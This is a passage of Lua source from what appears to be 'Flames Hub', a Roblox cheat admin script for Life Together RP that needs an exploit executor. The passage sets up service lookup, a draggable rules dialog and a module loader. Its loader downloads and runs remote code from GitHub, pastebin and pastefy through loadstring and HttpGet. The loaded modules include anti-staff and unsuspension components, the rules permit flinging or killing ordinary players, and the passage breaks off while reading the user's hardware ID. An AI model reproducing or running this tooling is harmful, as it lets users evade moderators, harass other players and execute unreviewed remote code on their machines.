      for i = 1, len_a do
         for j = 1, len_b do
            local cost = (a:sub(i,i) == b:sub(j,j)) and 0 or 1
            matrix[i][j] = math.min(
               matrix[i-1][j] + 1,
               matrix[i][j-1] + 1,
               matrix[i-1][j-1] + cost
            )
         end
      end

      return matrix[len_a][len_b]
   end

   local function resolve_service(input)
      if not input then return nil end

      local lowered = tostring(input):lower()

      if aliases[lowered] then
         return aliases[lowered]
      end

      local children = game:GetChildren()

      for _, svc in ipairs(children) do
         if svc.Name:lower() == lowered then
            return svc.Name
         end
      end

      for _, svc in ipairs(children) do
         if svc.Name:lower():find(lowered, 1, true) then
            return svc.Name
         end
      end

      local best_name
      local best_score = math.huge

      for _, svc in ipairs(children) do
         local score = levenshtein(lowered, svc.Name:lower())
         if score < best_score then
            best_score = score
            best_name = svc.Name
         end
      end

      if best_score <= 4 then
         return best_name
      end

      return nil
   end

   local function fetch_value(name)
      if not name then return nil end

      local lowered = tostring(name):lower()

      if virtuals[lowered] then
         local ok, players = pcall(function()
            return getgenv().service_cache["Players"].LocalPlayer
         end)

         if not ok or not players then
            return nil
         end

         local lp = players.LocalPlayer
         if lp then
            return lowered, lp
         end

         return nil
      end

      local resolved = resolve_service(name)
      if not resolved then return nil end

      local ok, svc = pcall(function()
         return game:GetService(resolved)
      end)

      if not ok or not svc then return nil end

      if cloneref then
         local success, cloned = pcall(function()
            return cloneref(svc)
         end)
         if success and cloned then
            svc = cloned
         end
      end

      return resolved, svc
   end

   if setmetatable and getmetatable and rawget and rawset then
      if not getmetatable(getgenv().service_cache) then
         setmetatable(getgenv().service_cache, {
            __index = function(self, key)

               local existing = rawget(self, key)
               if existing then
                  return existing
               end

               local resolved_key, value = fetch_value(key)
               if not value then
                  return nil
               end

               rawset(self, key, value)

               if resolved_key and resolved_key ~= key then
                  rawset(self, resolved_key, value)
               end

               return value
            end
         })
      end

      getgenv().safe_wrapper = function(name)
         if not name then return nil end
         return getgenv().service_cache[name]
      end
   else
      getgenv().safe_wrapper = function(name)
         if not name then return nil end

         if getgenv().service_cache[name] then
            return getgenv().service_cache[name]
         end

         local resolved_key, value = fetch_value(name)
         if not value then return nil end

         getgenv().service_cache[name] = value

         if resolved_key and resolved_key ~= name then
            getgenv().service_cache[resolved_key] = value
         end

         return value
      end
   end
   wait(0.2)
   if not safe_wrapper or typeof(safe_wrapper) ~= "function" then repeat task.wait() until typeof(safe_wrapper) == "function" end
   getgenv().type = typeof or type
   getgenv().string_contains_plain = getgenv().string_contains_plain or function(source, needle)
      if typeof(source) ~= "string" or typeof(needle) ~= "string" then
         return false
      end
      return source:lower():find(needle:lower(), 1, true) ~= nil
   end

   local playersService = getgenv().Players or game:GetService("Players")
   local tcs = getgenv().TextChatService or game:GetService("TextChatService")
   local localPlayer = getgenv().LocalPlayer or playersService.LocalPlayer
   local whisperChat = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat
   local spawnFn = (getgenv().FlamesLibrary and getgenv().FlamesLibrary.spawn)
   local function findChannelsWithUser(userId)
      local channelList = {}
      for _, channel in ipairs(tcs:GetChildren()) do
         if channel:IsA("TextChannel") then
            for _, textSource in ipairs(channel:GetChildren()) do
               if textSource:IsA("TextSource") and textSource.UserId == userId then
                  table.insert(channelList, channel)
                  break
               end
            end
         end
      end
      return channelList
   end

   --[[local previousChannels = findChannelsWithUser(localPlayer.UserId)
   local newChannels = {}
   local allowedPlayers = {}
   local players = playersService:GetPlayers()
   local pending = 0
   local done = Instance.new("BindableEvent")
   local maxThreads = 5
   local active = 0

   for _, plr in ipairs(players) do
      if plr ~= localPlayer then
         while active >= maxThreads do
            task.wait()
         end

         active = active + 1

         spawnFn(function()
            pcall(function()
               whisperChat:InvokeServer(plr.UserId)
            end)

            active -= 1
         end)
      end
   end

   spawnFn(function()
      if pending > 0 then
         done.Event:Wait()
      end

      for _, channel in ipairs(newChannels) do
         if not table.find(previousChannels, channel) then
            channel:Destroy()
         end
      end

      local totalTargets = math.max(#players - 1, 0)
      print(("Total players that can chat with %s: %d out of %d")
         :format(localPlayer.Name, #allowedPlayers, totalTargets))

      if #allowedPlayers > 0 then
         print(table.concat(allowedPlayers, ", "))
      end

      done:Destroy()
   end)--]]

   local UIS = getgenv().UserInputService or cloneref and cloneref(game:GetService("UserInputService")) or game:GetService("UserInputService")
   local executor_string = nil
   local function executor_contains(substr)
      if type(executor_string) ~= "string" then
         return false
      end
      return string.find(string.lower(executor_string), string.lower(substr), 1, true) ~= nil
   end

   local function retrieve_executor()
      local name
      if identifyexecutor then
         name = identifyexecutor()
      end
      return { Name = name or "Unknown Executor" }
   end

   local function identify_executor()
      local executorinfo = retrieve_executor()
      return tostring(executorinfo.Name)
   end

   executor_string = identify_executor()

   function low_level_executor()
      if executor_contains("solara") then return true end
      if executor_contains("jjsploit") then return true end
      if executor_contains("xeno") then return true end
      return false
   end

   getgenv().randomString = getgenv().randomString or function()
      local length = math.random(10,20)
      local array = {}
      for i = 1, length do
         array[i] = string.char(math.random(32, 126))
      end
      return table.concat(array)
   end

   getgenv().blankfunction = getgenv().blankfunction or function(...)
      return ...
   end

   local CoreGui = safe_wrapper("CoreGui")

   if getgenv().LifeTogether_RP_ScriptHub_Loaded then
      if getgenv().notify then
         return getgenv().notify("Warning", "You've already loaded the Life Together RP - Script Hub, you cannot load both.", 8)
      else
         return 
      end
   end

   if getgenv().LifeTogetherRP_Admin and getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub == false then
      if getgenv().notify then
         return getgenv().notify("Warning", "Life Together RP admin has already been loaded.", 6)
      else
         return 
      end
   elseif getgenv().LifeTogetherRP_Admin and getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub then
      return 
   end

   getgenv().ConstantUpdate_Checker_Live = true

   if isfile and not isfile("flames_hub_agreement_COPY.txt") then
      pcall(function()
         writefile("flames_hub_agreement_COPY.txt", "has not decided")
      end)
   end
   wait(0.2)
   do
      local uis = safe_wrapper("UserInputService")
      local ts  = safe_wrapper("TweenService")
      local rs  = safe_wrapper("RunService")
      local active_frame     = nil
      local active_drag_start = nil
      local active_start_pos  = nil
      local last_input_pos    = nil
      local active_tween      = nil
      local GLOBAL_KEY = "dragify_global"
      local TWEEN_INFO = TweenInfo.new(0.05, Enum.EasingStyle.Linear)
      local MIN_DELTA  = 2
      local function cancel_tween()
         if active_tween then
            pcall(function() active_tween:Cancel() end)
            active_tween = nil
         end
      end

      local function stop_drag()
         active_frame      = nil
         active_drag_start = nil
         active_start_pos  = nil
         last_input_pos    = nil
         cancel_tween()
      end

      local function frame_valid(f)
         local ok, res = pcall(function()
            return f and f.Parent and f:IsDescendantOf(game)
         end)
         return ok and res
      end

      getgenv().FlamesLibrary.connect(GLOBAL_KEY, rs.Heartbeat:Connect(function()
         if not active_frame or not last_input_pos then return end

         if not frame_valid(active_frame) then
            stop_drag()
            return
         end

         local delta = last_input_pos - active_drag_start
         if delta.Magnitude < MIN_DELTA then return end

         local sp  = active_start_pos
         local pos = UDim2.new(
            sp.X.Scale,
            sp.X.Offset + delta.X,
            sp.Y.Scale,
            sp.Y.Offset + delta.Y
         )

         cancel_tween()
         active_tween = ts:Create(active_frame, TWEEN_INFO, { Position = pos })
         active_tween:Play()
      end))

      getgenv().FlamesLibrary.connect(GLOBAL_KEY, uis.InputChanged:Connect(function(input)
         if not active_frame then return end
         if input.UserInputType == Enum.UserInputType.MouseMovement
         or input.UserInputType == Enum.UserInputType.Touch then
            last_input_pos = input.Position
         end
      end))

      getgenv().FlamesLibrary.connect(GLOBAL_KEY, uis.InputEnded:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1
         or input.UserInputType == Enum.UserInputType.Touch then
            stop_drag()
         end
      end))

      getgenv().dragify = function(frame)
         if not frame then return end
         while not frame_valid(frame) do task.wait() end
         local frame_key = "dragify_" .. tostring(frame) .. "_" .. tostring(frame:GetDebugId())
         getgenv().FlamesLibrary.connect(frame_key, frame.InputBegan:Connect(function(input)
            if not frame_valid(frame) then return end
            if uis:GetFocusedTextBox() then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
               if active_frame and active_frame ~= frame then
                  stop_drag()
               end

               active_frame      = frame
               active_drag_start = input.Position
               active_start_pos  = frame.Position
               last_input_pos    = input.Position
            end
         end))

         getgenv().FlamesLibrary.connect(frame_key, frame.AncestryChanged:Connect(function(_, parent)
            if not parent then
               if active_frame == frame then
                  stop_drag()
               end
               getgenv().FlamesLibrary.disconnect(frame_key)
            end
         end))
      end
   end

   getgenv().has_agreed_to_flames_hub_rules_boolean_val = getgenv().has_agreed_to_flames_hub_rules_boolean_val or false
   getgenv().disagreed_to_flames_hub_admin_rules = getgenv().disagreed_to_flames_hub_admin_rules or false

   local function check_file_agreed()
      if not (isfile and isfile("flames_hub_agreement_COPY.txt")) then return end

      local ok, data = pcall(readfile, "flames_hub_agreement_COPY.txt")
      if not ok then return end

      if data == "Yes" then
         getgenv().has_agreed_to_flames_hub_rules_boolean_val = true
      elseif data == "No" then
         getgenv().disagreed_to_flames_hub_admin_rules = true
         getgenv().has_agreed_to_flames_hub_rules_boolean_val = false
      elseif data == "has not decided" then
         getgenv().has_agreed_to_flames_hub_rules_boolean_val = false
      end
   end

   check_file_agreed()

   if getgenv().disagreed_to_flames_hub_admin_rules then
      if writefile then writefile("flames_hub_agreement_COPY.txt", "has not decided") end
      getgenv().disagreed_to_flames_hub_admin_rules = false
      if getgenv().notify then
         getgenv().notify("Warning", "YOU PREVIOUSLY DECLINED THE RULES, PLEASE REJOIN TO BE ABLE TO AGREEE!", 30)
      end
   end

   if isfile and not isfile("flames_hub_agreement_COPY.txt") then
      if writefile then
         writefile("flames_hub_agreement_COPY.txt", "has not decided")
      end
   end

   getgenv().has_agreed_to_flames_hub_rules_boolean_val = getgenv().has_agreed_to_flames_hub_rules_boolean_val or false

   function check_file_agreed()
      if isfile and isfile("flames_hub_agreement_COPY.txt") then
         local ok, data = pcall(readfile, "flames_hub_agreement_COPY.txt")

         if ok and data == "Yes" then
            getgenv().has_agreed_to_flames_hub_rules_boolean_val = true
         elseif ok and data == "No" then
            getgenv().disagreed_to_flames_hub_admin_rules = true
         elseif ok and data == "has not decided" then
            getgenv().has_agreed_to_flames_hub_rules_boolean_val = false
         end
      end
   end

   check_file_agreed()
   local Flames_API = loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/Flame_Hubs_API.lua"))()
   local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/Notification_Lib.lua"))()
   local valid_titles = {success="Success",info="Info",warning="Warning",error="Error",succes="Success",sucess="Success",eror="Error",erorr="Error",warnin="Warning"}
   local function format_title(str)
      if typeof(str) ~= "string" then
         return "Info"
      end

      local key = str:lower()
      return valid_titles[key] or "Info"
   end

   getgenv().notify = function(title, msg, dur)
      if getgenv().dont_receive_any_notifications_flames_hub then
         warn(tostring(game.Players.LocalPlayer).." has disabled notifications.")
      else
         local fixed_title = format_title(title)
         NotifyLib:External_Notification(fixed_title, tostring(msg), tonumber(dur))
      end
   end

   local are_we_low_level = low_level_executor()

   if are_we_low_level == true then
      return getgenv().notify("Error", "Your executor cannot run this script, it requires a better executor like Volcano, Potassium, Volt, Wave, Delta etc, we apologize!", 60)
   end

   if not getgenv().has_agreed_to_flames_hub_rules_boolean_val then
      function rules_GUI(toggle)
         getgenv().has_decided_to_flames_hub_rules = getgenv().has_decided_to_flames_hub_rules or false
         local screenSize = workspace.CurrentCamera.ViewportSize
         local isMobile = screenSize.X < 800
         local frameWidth = isMobile and math.floor(screenSize.X * 0.92) or 324
         local frameHeight = isMobile and math.floor(screenSize.Y * 0.88) or 700
         local framePosX = isMobile and ((screenSize.X - frameWidth) / 2) / screenSize.X or 0.183611527
         local framePosY = isMobile and ((screenSize.Y - frameHeight) / 2) / screenSize.Y or 0.05
         local rules = {
            "[1]. No harassment, bullying, or otherwise targeting towards other users/clients.",
            "[2]. Do not pretend you're the owner of the script.",
            "[3]. You are NOT allowed to disrespect the owner (like killing/flinging, talking shit, etc).",
            "[4]. You ARE allowed to fling/kill/void regular people, NOT other Flames Hub users/clients.",
            "[5]. Do not attempt to replicate, leak, or redistribute this script, you WILL be issued a DMCA.",
            "[6]. Do not attempt to exploit loopholes in these rules — use common sense.",
         }

         local FlamesHubRulesGUI = Instance.new("ScreenGui")
         local FlamesHubRulesFrame = Instance.new("Frame")
         local UICorner = Instance.new("UICorner")
         local Close = Instance.new("TextButton")
         local UICorner_2 = Instance.new("UICorner")
         local TitleLabel = Instance.new("TextLabel")
         local UICorner_3 = Instance.new("UICorner")
         local BlacklistHeader = Instance.new("TextLabel")
         local UICorner_4 = Instance.new("UICorner")
         local WarningLabel = Instance.new("TextLabel")
         local UICorner_5 = Instance.new("UICorner")
         local SuspiciousLabel = Instance.new("TextLabel")
         local UICorner_6 = Instance.new("UICorner")
         local AgreementLabel = Instance.new("TextLabel")
         local UICorner_7 = Instance.new("UICorner")
         local ReportLabel = Instance.new("TextLabel")
         local UICorner_8 = Instance.new("UICorner")
         local AgreeButton = Instance.new("TextButton")
         local UICorner_9 = Instance.new("UICorner")
         local DeclineButton = Instance.new("TextButton")
         local UICorner_10 = Instance.new("UICorner")

         FlamesHubRulesGUI.Name = tostring(getgenv().randomString())
         FlamesHubRulesGUI.Parent = CoreGui
         FlamesHubRulesGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
         FlamesHubRulesGUI.ResetOnSpawn = false
         FlamesHubRulesGUI.Enabled = toggle

         FlamesHubRulesFrame.Name = "FlamesHubRulesFrame"
         FlamesHubRulesFrame.Parent = FlamesHubRulesGUI
         FlamesHubRulesFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
         FlamesHubRulesFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
         FlamesHubRulesFrame.BorderSizePixel = 0
         FlamesHubRulesFrame.Position = UDim2.new(framePosX, 0, framePosY, 0)
         FlamesHubRulesFrame.Size = UDim2.new(0, frameWidth, 0, frameHeight)
         UICorner.CornerRadius = UDim.new(0, 8)
         UICorner.Parent = FlamesHubRulesFrame

         local ScrollFrame = Instance.new("ScrollingFrame")
         ScrollFrame.Parent = FlamesHubRulesFrame
         ScrollFrame.BackgroundTransparency = 1
         ScrollFrame.BorderSizePixel = 0
         ScrollFrame.Position = UDim2.new(0, 0, 0, 40)
         ScrollFrame.Size = UDim2.new(1, 0, 1, -100)
         ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
         ScrollFrame.ScrollBarThickness = isMobile and 4 or 6
         ScrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
         ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 179, 255)

         local UIListLayout = Instance.new("UIListLayout")
         UIListLayout.Parent = ScrollFrame
         UIListLayout.Padding = UDim.new(0, 6)
         UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
         UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

         local UIPadding = Instance.new("UIPadding")
         UIPadding.Parent = ScrollFrame
         UIPadding.PaddingTop = UDim.new(0, 8)
         UIPadding.PaddingLeft = UDim.new(0, 10)
         UIPadding.PaddingRight = UDim.new(0, 10)

         Close.Name = "Close"
         Close.Parent = FlamesHubRulesFrame
         Close.BackgroundColor3 = Color3.fromRGB(0, 179, 255)
         Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
         Close.BorderSizePixel = 0
         Close.Position = UDim2.new(1, -44, 0, 0)
         Close.Size = UDim2.new(0, 44, 0, 36)
         Close.Font = Enum.Font.Roboto
         Close.Text = "X"
         Close.TextColor3 = Color3.fromRGB(0, 0, 0)
         Close.TextScaled = true
         Close.TextSize = 14
         Close.TextWrapped = true
         UICorner_2.CornerRadius = UDim.new(0, 8)
         UICorner_2.Parent = Close

         TitleLabel.Parent = FlamesHubRulesFrame
         TitleLabel.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
         TitleLabel.BackgroundTransparency = 0.5
         TitleLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
         TitleLabel.BorderSizePixel = 0
         TitleLabel.Position = UDim2.new(0, 0, 0, 0)
         TitleLabel.Size = UDim2.new(1, -44, 0, 36)
         TitleLabel.Font = Enum.Font.Jura
         TitleLabel.Text = "Flames Hub | AGREEMENT"
         TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
         TitleLabel.TextScaled = true
         TitleLabel.TextSize = 14
         TitleLabel.TextWrapped = true
         UICorner_3.CornerRadius = UDim.new(0, 8)
         UICorner_3.Parent = TitleLabel

         BlacklistHeader.Parent = ScrollFrame
         BlacklistHeader.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
         BlacklistHeader.BackgroundTransparency = 0.3
         BlacklistHeader.BorderColor3 = Color3.fromRGB(0, 0, 0)
         BlacklistHeader.BorderSizePixel = 0
         BlacklistHeader.Size = UDim2.new(1, 0, 0, 36)
         BlacklistHeader.Font = Enum.Font.Jura
         BlacklistHeader.Text = "BLACKLIST-ABLE OFFENSES INCLUDE:"
         BlacklistHeader.TextColor3 = Color3.fromRGB(0, 0, 0)
         BlacklistHeader.TextScaled = true
         BlacklistHeader.TextSize = 14
         BlacklistHeader.TextWrapped = true
         BlacklistHeader.LayoutOrder = 1
         UICorner_4.CornerRadius = UDim.new(0, 6)
         UICorner_4.Parent = BlacklistHeader

         for i, ruleText in ipairs(rules) do
            local ruleLabel = Instance.new("TextLabel")
            local ruleCorner = Instance.new("UICorner")
            ruleLabel.Parent = ScrollFrame
            ruleLabel.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
            ruleLabel.BackgroundTransparency = 0.5
            ruleLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
            ruleLabel.BorderSizePixel = 0
            ruleLabel.Size = UDim2.new(1, 0, 0, 46)
            ruleLabel.Font = Enum.Font.Jura
            ruleLabel.Text = ruleText
            ruleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            ruleLabel.TextScaled = true
            ruleLabel.TextSize = 14
            ruleLabel.TextWrapped = true
            ruleLabel.LayoutOrder = i + 1
            ruleCorner.CornerRadius = UDim.new(0, 6)
            ruleCorner.Parent = ruleLabel
         end

         WarningLabel.Parent = ScrollFrame
         WarningLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
         WarningLabel.BackgroundTransparency = 0.3
         WarningLabel.BorderSizePixel = 0
         WarningLabel.Size = UDim2.new(1, 0, 0, 46)
         WarningLabel.Font = Enum.Font.Jura
         WarningLabel.Text = "If you break these rules, I can blacklist you anytime without notice."
         WarningLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
         WarningLabel.TextScaled = true
         WarningLabel.TextWrapped = true
         WarningLabel.LayoutOrder = 10
         UICorner_5.CornerRadius = UDim.new(0, 6)
         UICorner_5.Parent = WarningLabel

         SuspiciousLabel.Parent = ScrollFrame
         SuspiciousLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
         SuspiciousLabel.BackgroundTransparency = 0.3
         SuspiciousLabel.BorderSizePixel = 0
         SuspiciousLabel.Size = UDim2.new(1, 0, 0, 46)
         SuspiciousLabel.Font = Enum.Font.Jura
         SuspiciousLabel.Text = "I can check your logs at anytime without notice if I believe suspicious activity may be involved."
         SuspiciousLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
         SuspiciousLabel.TextScaled = true
         SuspiciousLabel.TextWrapped = true
         SuspiciousLabel.LayoutOrder = 11
         UICorner_6.CornerRadius = UDim.new(0, 6)
         UICorner_6.Parent = SuspiciousLabel

         AgreementLabel.Parent = ScrollFrame
         AgreementLabel.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
         AgreementLabel.BackgroundTransparency = 0.5
         AgreementLabel.BorderSizePixel = 0
         AgreementLabel.Size = UDim2.new(1, 0, 0, 36)
         AgreementLabel.Font = Enum.Font.Jura
         AgreementLabel.Text = "By agreeing, you hereby accept our Terms And Conditions within our services (TOS)."
         AgreementLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
         AgreementLabel.TextScaled = true
         AgreementLabel.TextWrapped = true
         AgreementLabel.LayoutOrder = 12
         UICorner_7.CornerRadius = UDim.new(0, 6)
         UICorner_7.Parent = AgreementLabel

         ReportLabel.Parent = ScrollFrame
         ReportLabel.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
         ReportLabel.BackgroundTransparency = 0.5
         ReportLabel.BorderSizePixel = 0
         ReportLabel.Size = UDim2.new(1, 0, 0, 46)
         ReportLabel.Font = Enum.Font.Jura
         ReportLabel.Text = "If a user is breaking these rules, report them to me either via the feedback command or DM me directly."
         ReportLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
         ReportLabel.TextScaled = true
         ReportLabel.TextWrapped = true
         ReportLabel.LayoutOrder = 13
         UICorner_8.CornerRadius = UDim.new(0, 6)
         UICorner_8.Parent = ReportLabel

         local ButtonBar = Instance.new("Frame")
         ButtonBar.Parent = FlamesHubRulesFrame
         ButtonBar.BackgroundTransparency = 1
         ButtonBar.BorderSizePixel = 0
         ButtonBar.Position = UDim2.new(0, 0, 1, -60)
         ButtonBar.Size = UDim2.new(1, 0, 0, 60)

         AgreeButton.Name = "AgreeButton"
         AgreeButton.Parent = ButtonBar
         AgreeButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
         AgreeButton.BackgroundTransparency = 1
         AgreeButton.Position = UDim2.new(0.1, 0, 0, 0)
         AgreeButton.Size = UDim2.new(0.35, 0, 1, 0)
         AgreeButton.Font = Enum.Font.Sarpanch
         AgreeButton.Text = "✅"
         AgreeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
         AgreeButton.TextScaled = true
         AgreeButton.TextWrapped = true
         UICorner_9.Parent = AgreeButton

         DeclineButton.Name = "DeclineButton"
         DeclineButton.Parent = ButtonBar
         DeclineButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
         DeclineButton.BackgroundTransparency = 1
         DeclineButton.Position = UDim2.new(0.55, 0, 0, 0)
         DeclineButton.Size = UDim2.new(0.35, 0, 1, 0)
         DeclineButton.Font = Enum.Font.Sarpanch
         DeclineButton.Text = "❌"
         DeclineButton.TextColor3 = Color3.fromRGB(0, 0, 0)
         DeclineButton.TextScaled = true
         DeclineButton.TextWrapped = true
         UICorner_10.Parent = DeclineButton

         local function GKZNWM_fake_script()
            local script = Instance.new("LocalScript", FlamesHubRulesGUI)
            local GUI = script.Parent
            if GUI then
               GUI.Parent = CoreGui
            end
         end
         coroutine.wrap(GKZNWM_fake_script)()

         local function XOFVNK_fake_script()
            local script = Instance.new("LocalScript", Close)
            script.Parent.MouseButton1Click:Connect(function()
               script.Parent.Parent.Parent.Enabled = false
               getgenv().disagreed_to_flames_hub_admin_rules = false
               getgenv().has_decided_to_flames_hub_rules = true
               getgenv().notify("Success", "You may continue to use Flames Hub | Life Together Admin.", 15)
               if writefile then
                  writefile("flames_hub_agreement_COPY.txt", "Yes")
               end
            end)
         end
         coroutine.wrap(XOFVNK_fake_script)()

         local function ZYWMNOC_fake_script()
            local script = Instance.new("LocalScript", FlamesHubRulesFrame)
            getgenv().dragify(script.Parent)
         end
         coroutine.wrap(ZYWMNOC_fake_script)()

         local function NSZX_fake_script()
            local script = Instance.new("LocalScript", AgreeButton)
            script.Parent.MouseButton1Click:Connect(function()
               script.Parent.Parent.Parent.Parent.Enabled = false
               getgenv().disagreed_to_flames_hub_admin_rules = false
               getgenv().has_decided_to_flames_hub_rules = true
               getgenv().notify("Success", "You may continue to use Flames Hub | Life Together Admin.", 15)
               if writefile then
                  writefile("flames_hub_agreement_COPY.txt", "Yes")
               end
            end)
         end
         coroutine.wrap(NSZX_fake_script)()

         local function VCPZZ_fake_script()
            local script = Instance.new("LocalScript", DeclineButton)
            script.Parent.MouseButton1Click:Connect(function()
               script.Parent.Parent.Parent.Parent.Enabled = false
               getgenv().disagreed_to_flames_hub_admin_rules = true
               getgenv().has_decided_to_flames_hub_rules = true
               if writefile then
                  writefile("flames_hub_agreement_COPY.txt", "No")
               end
               return getgenv().notify("Error", "You disagreed/declined! You may NOT use this script, you MUST agree to the rules (rejoin).", 30)
            end)
         end
         coroutine.wrap(VCPZZ_fake_script)()
      end

      if getgenv().disagreed_to_flames_hub_admin_rules then
         return
      end

      rules_GUI(true)

      repeat
         task.wait()
      until getgenv().has_decided_to_flames_hub_rules
   end

   local http_requesting = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
   local httpreq = http_requesting
   local function normalize_response(res)
      local status = res.StatusCode or res.statusCode or res.status or res.Status
      local body = res.Body or res.body or res.Response or res.response or ""
      return status, body
   end

   getgenv().try_load = function(urls)
      for i = 1, #urls do
         local url = urls[i]
         local ok, res = pcall(function()
            return http_requesting({ Url = url, Method = "GET" })
         end)

         if ok and res then
            local status, body = normalize_response(res)
            if status == 200 and body ~= "" and not tostring(body):find("404: Not Found") then
               local f, err = loadstring(body)
               if f then
                  local s_ok, s_res = pcall(f)
                  if s_ok then
                     return s_res
                  else
                     return { failed = true, status = "load-error", url = url, body = tostring(s_res) }
                  end
               else
                  return { failed = true, status = "compile-error", url = url, body = tostring(err) }
               end
            end
         end
      end
      return { failed = true, status = "no-response", url = urls[#urls] }
   end

   getgenv().NotifyLib = try_load({
      "https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/main/Notification_Lib.lua",
      "https://pastebin.com/raw/tg4tu73Y",
      "https://pastefy.app/nks8Kwws/raw"
   })

   local github_urls = {
      GlobalEnv_Framework = {
         "https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/GlobalEnv_Framework.lua"
      },
      Life_Together_Network = {
         "https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/Life_Together_Network.lua"
      },
      Functions_API_LifeTogether = {
         "https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/Functions_API_LifeTogether.lua"
      },
      TextChatService_MessageConnection = {
         "https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/TextChatService_MessageConnection.lua"
      },
      LifeTogether_Anti_Staff = {
         "https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/LifeTogether_Anti_Staff.lua"
      },
      TextChatService_Unsuspension_Framework = {
         "https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/TextChatService_Unsuspension_Framework.lua"
      },
      Vehicle_Mapper = {
         "https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/Vehicle_Mapper.lua"
      },
      LifeTogether_Framework_Base_1 = {
         "https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/LifeTogether_Framework_Base_1.lua"
      },
      LifeTogether_Framework_Base_2 = {
         "https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/LifeTogether_Framework_Base_2.lua"
      },
      Dex_Explorer_Checker = {
         "https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/Dex_Explorer_Checker.lua"
      },
      Configuration_API = {
         "https://raw.githubusercontent.com/EnterpriseExperience/RushTeam/main/configuration.lua"
      },
      NotifyLib = {
         "https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/main/Notification_Lib.lua"
      },
      Life_Together_Admin = {
         "https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/LifeTogether_RP_Admin.lua"
      },
      grab_file_performance = {
         "https://raw.githubusercontent.com/EnterpriseExperience/OrionLibraryReWrittenCelery/main/grab_file_performance"
      }
   }

   local fallback_urls = {
      GlobalEnv_Framework = {
         "https://pastebin.com/raw/T25mDhBZ",
         "https://pastefy.app/MAylpl1S/raw"
      },
      Life_Together_Network = {
         "https://pastebin.com/raw/GiEmv8Qf",
         "https://pastefy.app/FT5eU1HK/raw"
      },
      Functions_API_LifeTogether = {
         "https://pastebin.com/raw/ksfZM2C4",
         "https://pastefy.app/kQzNQxn0/raw"
      },
      TextChatService_MessageConnection = {
         "https://pastebin.com/raw/dGqUbYRN",
         "https://pastefy.app/7RuiUZai/raw"
      },
      LifeTogether_Anti_Staff = {
         "https://pastebin.com/raw/UiQfWWwY",
         "https://pastefy.app/Se7QQ0KH/raw"
      },
      TextChatService_Unsuspension_Framework = {
         "https://pastebin.com/raw/XhJAGATg",
         "https://pastefy.app/Doe90TZW/raw"
      },
      Vehicle_Mapper = {
         "https://pastebin.com/raw/PqLNjqSs",
         "https://pastefy.app/BuZybou2/raw"
      },
      LifeTogether_Framework_Base_1 = {
         "https://pastebin.com/raw/Pq9cUCXi",
         "https://pastefy.app/UgnGF0pZ/raw"
      },
      LifeTogether_Framework_Base_2 = {
         "https://pastebin.com/raw/KR05npwT",
         "https://pastefy.app/sjjbUhBl/raw"
      },
      Dex_Explorer_Checker = {
         "https://pastebin.com/raw/Wz6LMVY3",
         "https://pastefy.app/LAo3b8qH/raw"
      },
      NotifyLib = {
         "https://pastebin.com/raw/tg4tu73Y",
         "https://pastefy.app/VuvO9md2/raw"
      },
      Life_Together_Admin = {
         "https://pastebin.com/raw/azPSzEjH",
         "https://pastefy.app/SiDMhe47/raw",
      },
      grab_file_performance = {
         "https://pastebin.com/raw/DuG2RmjF",
         "https://pastefy.app/nq0BT17K/raw"
      }
   }

   local Rbx_Analytics = game:GetService("RbxAnalyticsService")
   local GENV = getgenv()

   if not GENV.current_code_block_line then
      local hwid

      local function try(fn)
         local ok, res = pcall(fn)
         return ok and res or nil
      end

      local function getGlobal(name)
         if typeof(rawget) == "function" then
            return rawget(GENV, name)
         end
         return GENV[name]
      end

      local ghwid = getGlobal("gethwid")
